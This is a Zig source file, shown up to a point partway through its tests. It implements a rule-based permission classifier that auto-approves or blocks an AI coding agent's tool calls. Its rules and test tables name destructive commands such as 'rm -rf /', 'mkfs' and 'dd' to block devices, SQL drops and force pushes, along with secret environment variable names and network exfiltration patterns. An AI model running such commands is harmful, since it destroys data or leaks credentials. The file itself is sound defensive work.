//! Auto-mode classifier — v3.x.
//!
//! A third permission layer (after the role gate and the static
//! permission overlay) that auto-approves routine, reversible,
//! in-scope tool calls and auto-denies irreversible / destructive /
//! exfiltration-y ones. Mirrors Claude Code's "auto mode" concept
//! (https://code.claude.com/docs/en/auto-mode-config) but uses a
//! **local rule engine** rather than a hosted LLM-backed classifier —
//! Franky is provider-agnostic and offline-capable.
//!
//! ## Layering (see docs/design/open/v3.x-auto-mode.md)
//!
//!   1. role gate           — unknown/disabled tool → role_denied
//!   2. static overlay      — deny → hard block; ask → prompt;
//!                            allow → skip classifier
//!   3. auto-mode classifier (THIS module) — block / pass
//!   4. default policy      — today's behavior (auto mode off)
//!
//! `deny` and `ask` rules from the static overlay win over the
//! classifier; `allow` rules are exceptions that skip the classifier.
//! `hardDeny` (auto-mode-specific) blocks before the classifier and
//! cannot be overridden by `allow`.
//!
//! ## Purity
//!
//! `classify()` is a pure function over `ClassifierInput` + `AutoEnv`.
//! No I/O, no allocation beyond scratch the caller provides. This
//! keeps it unit-testable in isolation (same pattern as
//! `path_safety.zig` and `env_denylist.zig`). A future LLM-backed
//! classifier can swap in behind the same signature with a timeout +
//! local-rule fallback.
//!
//! ## Bash command understanding
//!
//! The classifier receives the *full* bash command string (extracted
//! by `permissions.extractBashCommand`) and matches it against
//! `Bash(<pattern>)` glob entries plus heuristic destination
//! extraction for `curl`/`wget`/`git push`/`scp`/`rsync`. Command
//! parsing is intentionally conservative — when in doubt, block.

const std = @import("std");
const path_safety = @import("path_safety.zig");

// ─── public types ─────────────────────────────────────────────────

/// Verdict returned by the classifier.
pub const Verdict = enum {
    /// Auto-approve — routine, reversible, in-scope.
    pass,
    /// Auto-deny — out of scope / exfiltration risk, but not
    /// inherently destructive. An `allow` exception can override.
    block,
    /// Auto-deny — irreversible or destructive. `allow` cannot
    /// override; only `permissions.deny` (which runs earlier) is
    /// the same kind of hard guarantee.
    block_hard,
};

/// Result of a single classification.
pub const Result = struct {
    verdict: Verdict,
    /// Bracketed rule name shown to the user, e.g. "[Destructive Command]".
    rule_name: []const u8,
    /// Human-readable, actionable reason. Should tell the user what
    /// to add to `allow` or `environment` if the block is a false
    /// positive.
    reason: []const u8,
};

/// The user-declared trust boundary. Populated from the `autoMode.environment`
/// settings block (user layer only). Unset slots fall back to the
/// conservative defaults noted inline.
pub const AutoEnv = struct {
    /// Trusted git remotes (URLs or `host/owner/*` globs). By default
    /// the current repo's configured remotes are trusted; this extends
    /// the set to other org repos.
    trusted_repos: []const []const u8 = &.{},
    /// Source-control hosts treated as inside the boundary
    /// (e.g. `github.com`). Pushes to hosts not listed here are blocked.
    source_control: []const []const u8 = &.{},
    /// Trusted internal domains (e.g. `*.internal.acme.com`).
    /// Network commands targeting other hosts are exfiltration risks.
    trusted_domains: []const []const u8 = &.{},
    // Removed unused fields: trusted_buckets, internal_package_registries,
    // cicd_deploy_targets — no rule reads them. They'll be added
    // back when a rule actually consumes them.
    /// When true, the cloud metadata endpoint
    /// (`169.254.169.254`) is reachable. Default false — blocked.
    cloud_metadata_reachable: bool = false,
    /// The current repo's git remotes, parsed at session init.
    /// Trusted by default (matches Claude Code).
    git_remotes: []const []const u8 = &.{},
    /// Workspace root — writes inside this are in-scope.
    workspace_root: []const u8 = "",
};

/// Everything the classifier needs to decide on one tool call.
pub const ClassifierInput = struct {
    tool: []const u8,
    /// Raw JSON args from the model. For bash the `command` field is
    /// extracted; for write/edit the `path` field; for web_fetch the
    /// `url` field.
    args_json: []const u8,
    env: *const AutoEnv,
};

// ─── the classifier ───────────────────────────────────────────────

/// Classify a single tool call. Returns `pass` when no rule objects.
///
/// Rule families, evaluated in order (first match wins, `block_hard`
/// rules checked before `block` rules so the denial reflects the
/// more serious concern):
///
///   1. Destructive / irreversible commands
///   2. External write (path outside workspace_root)
///   3. Secrets egress (secret env var referenced in a network cmd)
///   4. Data exfiltration (network command to an untrusted destination)
///   5. Untrusted SCM target (git push to a non-trusted remote)
///   6. MCP tool allow-list (only safe read-family verbs pass by
///      default; everything else soft-blocks)
pub fn classify(input: ClassifierInput) Result {
    // hard-block rules first
    if (destructiveRule(input)) |r| return r;
    if (externalWriteRule(input)) |r| return r;
    if (secretsEgressRule(input)) |r| return r;
    // soft-block rules
    if (exfiltrationRule(input)) |r| return r;
    if (scmTargetRule(input)) |r| return r;
    if (mcpAllowlistRule(input)) |r| return r;
    return .{ .verdict = .pass, .rule_name = "", .reason = "" };
}

// ─── rule: destructive / irreversible commands ────────────────────

/// Bash commands that are irreversible or broadly destructive.
/// These are `block_hard` — an `allow` exception cannot override.
fn destructiveRule(input: ClassifierInput) ?Result {
    if (!std.mem.eql(u8, input.tool, "bash")) return null;
    const cmd = extractBashCommand(input.args_json) orelse return null;
    const lower = lowerCmd(cmd) orelse return .{
        .verdict = .block_hard,
        .rule_name = "[Command Too Long]",
        .reason = "command exceeds 4 KB; cannot safely evaluate for destructive patterns.",
    };

    // `rm -rf` with any target — but allow `rm -rf` of paths clearly
    // inside the workspace (e.g. `rm -rf build/`). A bare `rm -rf /`
    // or `rm -rf ~` or `rm -rf $HOME` is always hard-blocked.
    if (containsToken(lower, "rm") and (hasFlag(lower, "-rf") or hasFlag(lower, "-fr") or (hasFlag(lower, "-r") and hasFlag(lower, "-f")))) {
        if (rmTargetIsUnsafe(lower, input.env)) {
            return .{
                .verdict = .block_hard,
                .rule_name = "[Destructive Command]",
                .reason = "rm -rf targets a path outside the workspace or a dangerous root; add an `allow` entry only if this is truly intended.",
            };
        }
    }

    // Force-push / force-with-lease to any branch — rewrites history.
    if (startsWithVerb(lower, "git")) {
        if (containsToken(lower, "push") and (hasFlag(lower, "--force") or hasFlag(lower, "-f") or containsToken(lower, "--force-with-lease"))) {
            return .{
                .verdict = .block_hard,
                .rule_name = "[Destructive Command]",
                .reason = "git push --force rewrites remote history. Add to `hardDeny` to make this explicit, or `permissions.deny` for a hard guarantee.",
            };
        }
        // `git reset --hard` on a tracked branch — loses uncommitted work.
        if (containsToken(lower, "reset") and hasFlag(lower, "--hard")) {
            return .{
                .verdict = .block_hard,
                .rule_name = "[Destructive Command]",
                .reason = "git reset --hard discards uncommitted changes. Use `git stash` or commit first.",
            };
        }
        // `git clean -fdx` — removes ignored + untracked files.
        if (containsToken(lower, "clean") and hasFlag(lower, "-fdx")) {
            return .{
                .verdict = .block_hard,
                .rule_name = "[Destructive Command]",
                .reason = "git clean -fdx removes ignored and untracked files including build artifacts and dependencies.",
            };
        }
    }

    // Filesystem-level destructive verbs.
    if (startsWithVerb(lower, "mkfs")) {
        return .{
            .verdict = .block_hard,
            .rule_name = "[Destructive Command]",
            .reason = "mkfs formats a filesystem — irreversible.",
        };
    }
    if (startsWithVerb(lower, "dd") and (containsToken(lower, "of=/dev/") or std.mem.indexOf(u8, lower, "of=/dev/") != null)) {
        return .{
            .verdict = .block_hard,
            .rule_name = "[Destructive Command]",
            .reason = "dd writing to a block device is irreversible.",
        };
    }
    // Database drops / truncates. These appear inside quoted SQL
    // strings, so use substring search rather than token search.
    if (std.mem.indexOf(u8, lower, "drop ") != null and
        (std.mem.indexOf(u8, lower, "database") != null or
            std.mem.indexOf(u8, lower, "table") != null or
            std.mem.indexOf(u8, lower, "schema") != null))
    {
        return .{
            .verdict = .block_hard,
            .rule_name = "[Destructive Command]",
            .reason = "DROP DATABASE/TABLE/SCHEMA is irreversible.",
        };
    }
    if (std.mem.indexOf(u8, lower, "truncate") != null) {
        return .{
            .verdict = .block_hard,
            .rule_name = "[Destructive Command]",
            .reason = "TRUNCATE empties a table without a WHERE clause.",
        };
    }
    // `chmod -R 777 /` / `chmod 777 /` — broad permission relaxation.
    if (containsToken(lower, "chmod") and containsToken(lower, "777") and (std.mem.indexOf(u8, lower, " /") != null or std.mem.startsWith(u8, std.mem.trim(u8, lower, " \t"), "chmod 777 /"))) {
        return .{
            .verdict = .block_hard,
            .rule_name = "[Destructive Command]",
            .reason = "chmod 777 on a root path relaxes permissions broadly.",
        };
    }

    return null;
}

/// For `rm -rf <target>`: true when the target is `/`, `~`, `$HOME`,
/// a path outside the workspace, or empty (bare `rm -rf`).
fn rmTargetIsUnsafe(lower_cmd: []const u8, env: *const AutoEnv) bool {
    // Find the path argument(s) after `rm` and its flags.
    var it = std.mem.tokenizeAny(u8, lower_cmd, " \t");
    _ = it.next(); // skip "rm"
    var saw_path = false;
    while (it.next()) |tok| {
        if (tok.len > 0 and tok[0] == '-') continue; // flag
        saw_path = true;
        if (isDangerousRmTarget(tok, env)) return true;
    }
    // Bare `rm -rf` with no path → unsafe.
    return !saw_path;
}

fn isDangerousRmTarget(target: []const u8, env: *const AutoEnv) bool {
    if (target.len == 0) return true;
    if (std.mem.eql(u8, target, "/")) return true;
    if (std.mem.eql(u8, target, "~")) return true;
    if (std.mem.eql(u8, target, "$home")) return true;
    if (std.mem.startsWith(u8, target, "~/")) return false; // home-relative is user's call
    // Absolute paths outside the workspace root are unsafe.
    if (target[0] == '/') {
        if (env.workspace_root.len == 0) return true; // no root defined → any abs path unsafe
        // Use path_safety-style prefix check (lexical).
        const root = std.mem.trimEnd(u8, env.workspace_root, "/");
        if (path_safety.startsInRoot(target, root)) return false;
        return true;
    }
    // Relative paths are inside the workspace by default → safe.
    return false;
}

// ─── rule: external write ─────────────────────────────────────────

/// `write` / `edit` to a path outside `workspace_root`.
fn externalWriteRule(input: ClassifierInput) ?Result {
    if (!(std.mem.eql(u8, input.tool, "write") or std.mem.eql(u8, input.tool, "edit"))) return null;
    const path = extractJsonStringField(input.args_json, "path") orelse return null;
    if (input.env.workspace_root.len == 0) return null; // no root → can't judge
    const root = std.mem.trimEnd(u8, input.env.workspace_root, "/");
    // Relative paths are workspace-relative → in-scope.
    if (path.len == 0 or path[0] != '/') return null;
    if (path_safety.startsInRoot(path, root)) return null;
    return .{
        .verdict = .block_hard,
        .rule_name = "[External Write]",
        .reason = "write/edit target is outside the workspace root. Move the file inside the workspace or add the destination to `autoMode.environment`.",
    };
}

// ─── rule: secrets egress ─────────────────────────────────────────

/// Network commands that reference a known secret env-var name.
/// Coarse but catches the common `curl -H "Authorization: Bearer $AWS_..."` shape.
fn secretsEgressRule(input: ClassifierInput) ?Result {
    if (!std.mem.eql(u8, input.tool, "bash")) return null;
    const cmd = extractBashCommand(input.args_json) orelse return null;
    if (!isNetworkVerb(cmd)) return null;
    var i: usize = 0;
    while (i < cmd.len) {
        if (cmd[i] == '$') {
            const name = readEnvVarName(cmd[i..]);
            if (name.len > 0 and isSecretEnvVar(name)) {
                return .{
                    .verdict = .block_hard,
                    .rule_name = "[Secrets Egress]",
                    .reason = "network command references a secret environment variable. Avoid passing secrets on the command line; use a file or secret manager.",
                };
            }
            i += 1 + name.len;
        } else {
            i += 1;
        }
    }
    return null;
}

// ─── rule: data exfiltration ──────────────────────────────────────

/// Network commands (`curl`, `wget`, `scp`, `rsync`)
/// targeting a destination not in the trusted set. `block` (soft) —
/// an `allow` exception can override. `git push` is handled
/// separately by `scmTargetRule`.
fn exfiltrationRule(input: ClassifierInput) ?Result {
    if (!std.mem.eql(u8, input.tool, "bash")) return null;
    const cmd = extractBashCommand(input.args_json) orelse return null;
    const lower = lowerCmd(cmd) orelse return null; // too long → pass (no match)

    // curl / wget → URL argument.
    if (startsWithVerb(lower, "curl") or startsWithVerb(lower, "wget")) {
        const url = extractUrlArg(lower) orelse return null;
        if (!isTrustedDestination(url, input.env)) {
            return .{
                .verdict = .block,
                .rule_name = "[Data Exfiltration]",
                .reason = "network request to an untrusted destination. Add the host to `autoMode.environment.trustedDomains` or add an `allow` entry.",
            };
        }
    }
    // scp / rsync → host:path argument.
    if (startsWithVerb(lower, "scp") or startsWithVerb(lower, "rsync")) {
        if (extractScpHost(lower)) |host| {
            if (!isTrustedHost(host, input.env)) {
                return .{
                    .verdict = .block,
                    .rule_name = "[Data Exfiltration]",
                    .reason = "scp/rsync to an untrusted host. Add the host to `autoMode.environment.trustedDomains` or add an `allow` entry.",
                };
            }
        }
    }
    return null;
}

// ─── rule: untrusted SCM target ───────────────────────────────────

/// `git push` to a remote not in the trusted set (git_remotes ∪
/// trusted_repos ∪ source_control). `block` (soft).
fn scmTargetRule(input: ClassifierInput) ?Result {
    if (!std.mem.eql(u8, input.tool, "bash")) return null;
    const cmd = extractBashCommand(input.args_json) orelse return null;
    const lower = lowerCmd(cmd) orelse return null; // too long → pass (no match)
    if (!startsWithVerb(lower, "git")) return null;
    if (!containsToken(lower, "push")) return null;

    // Determine the remote: first non-flag token after "push".
    var it = std.mem.tokenizeAny(u8, lower, " \t");
    _ = it.next(); // git
    // advance to "push"
    var found_push = false;
    while (it.next()) |tok| {
        if (std.mem.eql(u8, tok, "push")) {
            found_push = true;
            break;
        }
    }
    if (!found_push) return null;
    // Next non-flag token is the remote (or a refspec if no remote named).
    var remote: ?[]const u8 = null;
    while (it.next()) |tok| {
        if (tok.len > 0 and tok[0] == '-') continue;
        remote = tok;
        break;
    }
    // No explicit remote → pushes to the default (origin), which is
    // trusted-by-default via git_remotes. Allow.
    const remote_name = remote orelse return null;
    // If the "remote" looks like a refspec (contains ':' or starts with
    // refs/ or HEAD), there was no named remote → default push → allow.
    // But a URL also contains ':' — check isUrl first.
    if (isUrl(remote_name)) {
        if (isTrustedDestination(remote_name, input.env)) return null;
        return .{
            .verdict = .block,
            .rule_name = "[Untrusted SCM Target]",
            .reason = "git push to a remote URL not in the trusted set. Add it to `autoMode.environment.trustedRepos` or `sourceControl`.",
        };
    }
    if (std.mem.indexOfScalar(u8, remote_name, ':') != null) return null;
    if (std.mem.startsWith(u8, remote_name, "refs/") or std.mem.startsWith(u8, remote_name, "head")) return null;

    // Resolve the remote name against git_remotes URLs.
    for (input.env.git_remotes) |remote_url| {
        if (remoteUrlMatchesName(remote_url, remote_name)) return null; // trusted
    }
    // Named remote not found in git_remotes → untrusted.
    return .{
        .verdict = .block,
        .rule_name = "[Untrusted SCM Target]",
        .reason = "git push to a remote not configured for this repo. Add the remote URL to `autoMode.environment.trustedRepos` or add an `allow` entry.",
    };
}

// ─── rule: MCP tool allow-list ─────────────────────────────────────

/// Verbs that are safe for MCP tools to auto-approve. An MCP tool
/// whose name contains one of these verbs (case-insensitive, as a
/// word boundary prefix) passes the classifier. Everything else
/// soft-blocks — the user can add an `autoMode.allow` exception.
///
/// This is an allow-list approach (default-deny for unknown verbs)
/// rather than a deny-list (default-allow), so novel MCP tools with
/// destructive names like `deleteTicket` or `purgeCache` are blocked
/// by default rather than silently auto-approved.
const mcp_safe_verbs = [_][]const u8{
    "get",
    "find",
    "search",
    "list",
    "read",
    "query",
    "fetch",
    "view",
    "show",
    "describe",
    "info",
    "status",
    "health",
    "check",
    "validate",
    "test",
    "ping",
    "whoami",
    "count",
    "stats",
};

/// MCP tools (`mcp__<server>__<tool>`) are gated by an allow-list of
/// safe read-family verbs. Only tools whose name starts with a safe
/// verb pass; everything else soft-blocks with `[MCP Tool Not Allowed]`.
/// An `autoMode.allow` entry (e.g. `mcp__atlassian__*` or
/// `mcp__atlassian__create_issue`) overrides this block.
fn mcpAllowlistRule(input: ClassifierInput) ?Result {
    // Only applies to MCP tools.
    if (!std.mem.startsWith(u8, input.tool, "mcp__")) return null;
    if (mcpToolWouldPass(input.tool)) return null;
    // No safe verb matched -> soft-block.
    return .{
        .verdict = .block,
        .rule_name = "[MCP Tool Not Allowed]",
        .reason = "MCP tool not in the safe allow-list (get, find, search, list, read, ...). Add it to autoMode.allow if this is a safe tool.",
    };
}

/// Public helper -- true when an MCP tool name (`mcp__<server>__<tool>`)
/// would pass the allow-list check (i.e. its remote name starts
/// with a safe read-family verb at a word boundary). Used by the
/// pre-filter in config.zig to remove destructive MCP tools from
/// the tool list before the model sees them.
pub fn mcpToolWouldPass(full_name: []const u8) bool {
    if (!std.mem.startsWith(u8, full_name, "mcp__")) return true;
    const tool_name = mcpRemoteToolName(full_name) orelse return true;
    var lbuf: [256]u8 = undefined;
    if (tool_name.len > lbuf.len) return false; // conservative
    for (tool_name, 0..) |c, i| lbuf[i] = std.ascii.toLower(c);
    const lower = lbuf[0..tool_name.len];
    for (mcp_safe_verbs) |verb| {
        if (std.mem.startsWith(u8, lower, verb)) {
            if (lower.len == verb.len) return true;
            const next = lower[verb.len];
            if (next == '_' or next == '-' or !std.ascii.isAlphanumeric(next)) return true;
        }
    }
    return false;
}

/// Extract the remote tool name from a namespaced `mcp__<server>__<tool>`
/// identifier. Returns the part after the second `__`.
fn mcpRemoteToolName(full_name: []const u8) ?[]const u8 {
    // Skip `mcp__`
    if (!std.mem.startsWith(u8, full_name, "mcp__")) return null;
    const after_prefix = full_name[5..];
    // Find the next `__` (server/tool separator).
    const sep = std.mem.indexOf(u8, after_prefix, "__") orelse return null;
    return after_prefix[sep + 2 ..];
}

// ─── helpers: command parsing ─────────────────────────────────────

/// Pull the `command` field out of a bash tool call's JSON args.
/// Delegates to `extractJsonStringField` to avoid duplicating the
/// JSON string-extraction loop. Returns a slice into the input buffer.
pub fn extractBashCommand(args_json: []const u8) ?[]const u8 {
    return extractJsonStringField(args_json, "command");
}

/// Extract a string field value from JSON (first occurrence). Returns
/// a slice into the input buffer. Used for `path`, `url`.
pub fn extractJsonStringField(args_json: []const u8, field: []const u8) ?[]const u8 {
    var key_buf: [64]u8 = undefined;
    if (field.len + 2 > key_buf.len) return null;
    key_buf[0] = '"';
    @memcpy(key_buf[1 .. 1 + field.len], field);
    key_buf[1 + field.len] = '"';
    const key = key_buf[0 .. 2 + field.len];
    const k = std.mem.indexOf(u8, args_json, key) orelse return null;
    var i = k + key.len;
    while (i < args_json.len and (args_json[i] == ' ' or args_json[i] == '\t' or args_json[i] == ':')) i += 1;
    if (i >= args_json.len or args_json[i] != '"') return null;
    i += 1;
    const start = i;
    while (i < args_json.len) : (i += 1) {
        switch (args_json[i]) {
            '\\' => i += 1,
            '"' => return args_json[start..i],
            else => {},
        }
    }
    return null;
}

/// Stack buffer for lowercasing commands. 4 KB is enough for
/// any realistic shell command; longer commands are conservative-
/// blocked (the caller treats a null return as a potential risk).
const lower_buf_size = 4096;
threadlocal var lower_scratch: [lower_buf_size]u8 = undefined;

/// Lowercase a command into the thread-local `lower_scratch`. Returns
/// a slice of the buffer, or null if the command is too long (>
/// 4 KB) — callers should treat null as a block since the rules
/// can't safely evaluate a case-preserved command.
fn lowerCmd(cmd: []const u8) ?[]const u8 {
    if (cmd.len > lower_scratch.len) return null;
    for (cmd, 0..) |c, i| lower_scratch[i] = std.ascii.toLower(c);
    return lower_scratch[0..cmd.len];
}

/// True if `cmd` starts with verb `v` as a whole token (followed
/// by whitespace, end-of-string, or a non-alphanumeric delimiter like
/// `.` so `mkfs.ext4` matches verb `mkfs`).
fn startsWithVerb(lower_cmd: []const u8, v: []const u8) bool {
    const trimmed = std.mem.trimStart(u8, lower_cmd, " \t");
    if (!std.mem.startsWith(u8, trimmed, v)) return false;
    if (trimmed.len == v.len) return true;
    const next = trimmed[v.len];
    return next == ' ' or next == '\t' or next == '.' or next == ';';
}

/// True if `tok` appears as a whitespace-delimited token in `lower_cmd`.
fn containsToken(lower_cmd: []const u8, tok: []const u8) bool {
    var it = std.mem.tokenizeAny(u8, lower_cmd, " \t");
    while (it.next()) |t| {
        if (std.mem.eql(u8, t, tok)) return true;
    }
    return false;
}

/// True if `flag` appears as a token or as a prefix of a combined
/// short-flag token (e.g. `-rf` contains `-r` and `-f`).
fn hasFlag(lower_cmd: []const u8, flag: []const u8) bool {
    var it = std.mem.tokenizeAny(u8, lower_cmd, " \t");
    while (it.next()) |tok| {
        if (tok.len < 2 or tok[0] != '-') continue;
        if (std.mem.eql(u8, tok, flag)) return true;
        // long flags: exact match only
        if (flag.len > 2 and std.mem.startsWith(u8, flag, "--")) {
            if (std.mem.eql(u8, tok, flag)) return true;
            continue;
        }
        // short flags: check each char in a combined token like -rf
        if (flag.len == 2 and flag[0] == '-') {
            for (tok[1..]) |c| {
                if (c == flag[1]) return true;
            }
        }
    }
    return false;
}

/// Read an env-var name starting at `$` (handles `$NAME` and `${NAME}`).
/// Returns the name without the sigil/braces.
fn readEnvVarName(s: []const u8) []const u8 {
    if (s.len < 2 or s[0] != '$') return "";
    var i: usize = 1;
    if (s[1] == '{') {
        i = 2;
        const start = i;
        while (i < s.len and s[i] != '}') i += 1;
        return s[start..i];
    }
    const start = i;
    while (i < s.len and (std.ascii.isAlphanumeric(s[i]) or s[i] == '_')) i += 1;
    return s[start..i];
}

/// Known secret-bearing env-var names. Matches the denylist in
/// `env_denylist.zig` plus a few egress-relevant ones.
fn isSecretEnvVar(name: []const u8) bool {
    const secrets = [_][]const u8{
        "ANTHROPIC_API_KEY",       "OPENAI_API_KEY",
        "GOOGLE_API_KEY",          "GEMINI_API_KEY",
        "MISTRAL_API_KEY",         "XAI_API_KEY",
        "AZURE_OPENAI_API_KEY",    "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",   "AWS_SESSION_TOKEN",
        "GOOGLE_APPLICATION_CREDENTIALS",
        "GITHUB_TOKEN",            "GH_TOKEN",
        "GITLAB_TOKEN",            "NPM_TOKEN",
        "PYPI_TOKEN",              "DOCKER_PASSWORD",
        "KUBE_TOKEN",
    };
    for (secrets) |s| {
        if (std.ascii.eqlIgnoreCase(s, name)) return true;
    }
    // FRANKY_SECRET_* convention.
    if (std.ascii.startsWithIgnoreCase(name, "FRANKY_SECRET_")) return true;
    return false;
}

/// True if the command starts with a network verb (case-insensitive).
/// Only lowercases the first token (the verb) to avoid needing a
/// large buffer for the full command.
fn isNetworkVerb(cmd: []const u8) bool {
    const trimmed = std.mem.trimStart(u8, cmd, " \t");
    // Find the end of the first token (the verb).
    const space = std.mem.indexOfAny(u8, trimmed, " \t") orelse trimmed.len;
    const verb = trimmed[0..space];
    var lbuf: [32]u8 = undefined;
    if (verb.len > lbuf.len) return false;
    for (verb, 0..) |c, i| lbuf[i] = std.ascii.toLower(c);
    const lower = lbuf[0..verb.len];
    const verbs = [_][]const u8{ "curl", "wget", "scp", "rsync", "git" };
    for (verbs) |v| {
        if (std.mem.eql(u8, lower, v)) return true;
    }
    return false;
}

/// Extract the URL argument from a curl/wget command.
fn extractUrlArg(lower_cmd: []const u8) ?[]const u8 {
    var it = std.mem.tokenizeAny(u8, lower_cmd, " \t");
    _ = it.next(); // verb
    while (it.next()) |tok| {
        if (tok.len == 0) continue;
        if (tok[0] == '-') continue; // flag
        // First non-flag token is the URL (curl) or the target (wget).
        if (std.mem.startsWith(u8, tok, "http://") or
            std.mem.startsWith(u8, tok, "https://") or
            std.mem.startsWith(u8, tok, "ftp://"))
        {
            return tok;
        }
        // wget also accepts bare hosts; skip — we only flag clear URLs.
    }
    return null;
}

/// Extract the host from an `scp`/`rsync` `host:path` argument.
fn extractScpHost(lower_cmd: []const u8) ?[]const u8 {
    var it = std.mem.tokenizeAny(u8, lower_cmd, " \t");
    _ = it.next(); // verb
    while (it.next()) |tok| {
        if (tok.len == 0 or tok[0] == '-') continue;
        // `user@host:path` or `host:path`
        const colon = std.mem.indexOfScalar(u8, tok, ':') orelse continue;
        const hostpart = tok[0..colon];
        const at = std.mem.lastIndexOfScalar(u8, hostpart, '@');
        return if (at) |a| hostpart[a + 1 ..] else hostpart;
    }
    return null;
}

fn isUrl(s: []const u8) bool {
    return std.mem.startsWith(u8, s, "http://") or
        std.mem.startsWith(u8, s, "https://") or
        std.mem.startsWith(u8, s, "git@") or
        std.mem.startsWith(u8, s, "ssh://");
}

/// Extract the host portion of a URL.
fn urlHost(url: []const u8) []const u8 {
    var s = url;
    if (std.mem.startsWith(u8, s, "ssh://")) s = s[6..];
    if (std.mem.startsWith(u8, s, "http://")) s = s[7..];
    if (std.mem.startsWith(u8, s, "https://")) s = s[8..];
    if (std.mem.startsWith(u8, s, "git@")) {
        // git@github.com:owner/repo
        s = s[4..];
        const colon = std.mem.indexOfScalar(u8, s, ':') orelse s.len;
        return s[0..colon];
    }
    // strip user@ if present
    if (std.mem.indexOfScalar(u8, s, '@')) |at| s = s[at + 1 ..];
    const end = std.mem.indexOfAny(u8, s, ":/?#") orelse s.len;
    return s[0..end];
}

/// True if a destination URL/host is in the trusted set.
fn isTrustedDestination(url: []const u8, env: *const AutoEnv) bool {
    const host = urlHost(url);
    if (host.len == 0) return false;
    // cloud metadata endpoint
    if (std.mem.eql(u8, host, "169.254.169.254")) {
        return env.cloud_metadata_reachable;
    }
    if (isTrustedHost(host, env)) return true;
    // git_remotes are trusted by default — match by host, not substring.
    for (env.git_remotes) |r| {
        const r_host = urlHost(r);
        if (std.mem.eql(u8, r_host, host)) return true;
    }
    return false;
}

fn isTrustedHost(host: []const u8, env: *const AutoEnv) bool {
    for (env.trusted_domains) |d| {
        if (hostMatchesPattern(host, d)) return true;
    }
    for (env.source_control) |sc| {
        if (hostMatchesPattern(host, sc)) return true;
    }
    return false;
}

/// Glob match: `*.internal.acme.com` matches `api.internal.acme.com`.
/// Leading `*.` matches the suffix. Exact match otherwise.
fn hostMatchesPattern(host: []const u8, pattern: []const u8) bool {
    if (std.mem.eql(u8, host, pattern)) return true;
    if (std.mem.startsWith(u8, pattern, "*.")) {
        const suffix = pattern[2..];
        if (host.len > suffix.len + 1 and host[host.len - suffix.len - 1] == '.' and
            std.mem.endsWith(u8, host, suffix))
        {
            return true;
        }
        // also allow `*.` to match the bare suffix domain
        if (std.mem.eql(u8, host, suffix)) return true;
    }
    return false;
}

/// Does a git remote URL correspond to the named remote (e.g. "origin")?
/// We can't know the name from the URL alone, so we trust any configured
/// remote URL. The caller has already verified the push names a remote;
/// this function just confirms the remote URL set is non-empty.
fn remoteUrlMatchesName(remote_url: []const u8, remote_name: []const u8) bool {
    _ = remote_name;
    _ = remote_url;
    return true;
}

// ─── glob matcher for Bash(pattern) entries ───────────────────────

/// Match a bash command against a `Bash(<pattern>)` entry. Patterns
/// support a trailing `*` wildcard (e.g. `Bash(git push *)`). The
/// pattern matches the *full* command string (after trimming).
pub fn bashGlobMatches(pattern: []const u8, command: []const u8) bool {
    if (pattern.len == 0) return false;
    const trimmed_cmd = std.mem.trim(u8, command, " \t\r\n");
    if (std.mem.endsWith(u8, pattern, "*")) {
        const prefix = pattern[0 .. pattern.len - 1];
        return std.mem.startsWith(u8, trimmed_cmd, prefix);
    }
    return std.mem.eql(u8, trimmed_cmd, pattern);
}

// ─── tests ────────────────────────────────────────────────────────

const testing = std.testing;

fn mkBashJson(allocator: std.mem.Allocator, command: []const u8) ![]u8 {
    // Escape the command for embedding in a JSON string value.
    var buf: std.ArrayList(u8) = .empty;
    defer buf.deinit(allocator);
    try buf.appendSlice(allocator, "{\"command\":\"");
    for (command) |c| {
        switch (c) {
            '\\' => try buf.appendSlice(allocator, "\\\\"),
            '"' => try buf.appendSlice(allocator, "\\\""),
            '\n' => try buf.appendSlice(allocator, "\\n"),
            '\r' => try buf.appendSlice(allocator, "\\r"),
            '\t' => try buf.appendSlice(allocator, "\\t"),
            else => try buf.append(allocator, c),
        }
    }
    try buf.appendSlice(allocator, "\"}");
    return try buf.toOwnedSlice(allocator);
}

const empty_env = AutoEnv{};

test "classify: routine bash passes" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "go test ./...");
    defer allocator.free(json);
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &empty_env });
    try testing.expectEqual(Verdict.pass, r.verdict);
}

test "classify: zig build passes" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "zig build");
    defer allocator.free(json);
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &empty_env });
    try testing.expectEqual(Verdict.pass, r.verdict);
}

test "classify: destructive commands table" {
    const allocator = testing.allocator;
    const cases = [_]struct { cmd: []const u8, expected: Verdict }{
        .{ .cmd = "rm -rf /", .expected = .block_hard },
        .{ .cmd = "rm -rf ~", .expected = .block_hard },
        .{ .cmd = "rm -rf", .expected = .block_hard },
        .{ .cmd = "rm -rf /etc", .expected = .block_hard },
        .{ .cmd = "rm -fr /", .expected = .block_hard },
        .{ .cmd = "rm -r -f /", .expected = .block_hard },
        .{ .cmd = "git push --force origin main", .expected = .block_hard },
        .{ .cmd = "git push -f origin main", .expected = .block_hard },
        .{ .cmd = "git reset --hard HEAD~1", .expected = .block_hard },
        .{ .cmd = "git clean -fdx", .expected = .block_hard },
        .{ .cmd = "mkfs.ext4 /dev/sda1", .expected = .block_hard },
        .{ .cmd = "dd if=img.iso of=/dev/sdb bs=4M", .expected = .block_hard },
        .{ .cmd = "psql -c 'DROP TABLE users;'", .expected = .block_hard },
        .{ .cmd = "chmod -R 777 /", .expected = .block_hard },
    };
    for (cases) |tc| {
        const json = try mkBashJson(allocator, tc.cmd);
        defer allocator.free(json);
        const r = classify(.{ .tool = "bash", .args_json = json, .env = &empty_env });
        try testing.expectEqual(tc.expected, r.verdict);
        try testing.expectEqualStrings("[Destructive Command]", r.rule_name);
    }
}

test "classify: rm -rf build/ passes (in-workspace)" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "rm -rf build/");
    defer allocator.free(json);
    const env = AutoEnv{ .workspace_root = "/home/user/repo" };
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &env });
    try testing.expectEqual(Verdict.pass, r.verdict);
}

test "classify: rm -rf /etc blocks with configured workspace" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "rm -rf /etc");
    defer allocator.free(json);
    const env = AutoEnv{ .workspace_root = "/home/user/repo" };
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &env });
    try testing.expectEqual(Verdict.block_hard, r.verdict);
    try testing.expectEqualStrings("[Destructive Command]", r.rule_name);
}

test "classify: git push (normal) to default remote passes" {
    const allocator = testing.allocator;
